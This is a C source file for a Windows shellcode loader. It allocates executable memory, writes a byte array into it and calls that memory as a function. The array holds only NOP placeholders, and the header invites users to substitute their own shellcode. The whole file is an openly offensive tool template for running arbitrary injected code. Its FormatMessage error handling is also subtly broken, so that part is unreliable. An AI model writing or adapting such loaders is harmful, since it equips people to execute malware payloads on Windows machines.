/*
* 
* Author: Bruno Braga
* ShellCode Loader 
* Usage: Modify the shellCodeArray to your needs.
* Requirements: For Windows and tested on Windows 7
*
*
*
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
 

char shellCodeArray[] = {0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};

int main(int argc, char **argv){
	

	DWORD sizeOfShellCodeArray = sizeof(shellCodeArray);
	DWORD errorId = 0;
	LPCWSTR errorMessage = NULL;

	LPVOID shellcodeMemory = 0; 	
	BOOL wmResult = 0;

	shellcodeMemory = VirtualAlloc(NULL, sizeOfShellCodeArray,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READ);
	if (((DWORD) shellcodeMemory) == 0){
		errorId = GetLastError();
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_ALLOCATE_BUFFER,NULL,errorId,0,errorMessage,0,NULL);
		fprintf(stderr,"Failed to allocate memory:%s", errorMessage);
		return 1;
	}


	
	wmResult = WriteProcessMemory(GetCurrentProcess(),shellcodeMemory,&shellCodeArray,sizeOfShellCodeArray,NULL);

	if (wmResult == 0){
		errorId = GetLastError();
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_ALLOCATE_BUFFER,NULL,errorId,0,errorMessage,0,NULL);
		fprintf(stderr,"Failed to write shellcode to allocated memory:%s", errorMessage);
		return 1;
	}

	((void (*)(void))shellcodeMemory)();
	
}